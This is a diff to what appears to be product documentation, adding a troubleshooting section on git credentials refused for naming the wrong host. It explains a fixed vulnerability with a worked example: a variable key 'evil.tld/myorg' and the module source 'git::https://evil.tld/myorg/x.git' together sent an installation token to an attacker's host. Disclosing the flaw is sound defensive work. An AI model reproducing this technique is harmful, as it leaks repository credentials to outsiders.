@@ -2515,6 +2515,37 @@ cover every repository already in use; then remove entries as those workspaces a
 retired. See
 [security-hardening.md → Scope every VCS connection](security-hardening.md#scope-every-vcs-connection-to-an-owner-and-a-repository-set).
 
+## A minted git credential is refused for naming the wrong host
+
+A run fails with `git credential scope '…' names host '…', but VCS connection vcs-…
+serves '…'`.
+
+The variable's key is the scope the runner installs the token at, written verbatim
+into a git `[credential "https://<key>"]` section — so git sends that token to
+whatever host the key names. A credential minted from a connection is therefore only
+ever installed for **that connection's own host**, whatever the repository allowlist
+says, and **whether or not an allowlist is set at all**.
+
+**Fix the key's host.** For a GitHub connection that is `github.com`, or your GitHub
+Enterprise host — note the connection's `server-url` holds the **API** base
+(`https://ghe.example.com/api/v3`), while the key needs the git host
+(`ghe.example.com`). For GitLab the `server-url` host is the git host directly.
+
+If you genuinely need to authenticate to a different host, that is what a `static`
+credential is for: supply a token you have scoped yourself, and it is not checked
+against the connection. (GHSA-v8g7-pqrj-8mcm)
+
+### Why this is not negotiable
+
+The check is why a workspace variable cannot be used to exfiltrate a connection's
+credential. The mint path deliberately skips the connection-authorization check for
+the workspace's **own** connection, so anyone who can write a workspace variable
+chooses the key — and before this release a key of `evil.tld/myorg` passed a
+connection restricted to `myorg/*`, installed the GitHub App installation token for
+`evil.tld`, and a module source of `git::https://evil.tld/myorg/x.git` in the
+workspace's own configuration sent it there. That token carries `contents: read`
+across the whole installation.
+
 ## A minted git credential is refused for being too broadly scoped
 
 A run fails during `init` — or at variable resolution, before `init` — with
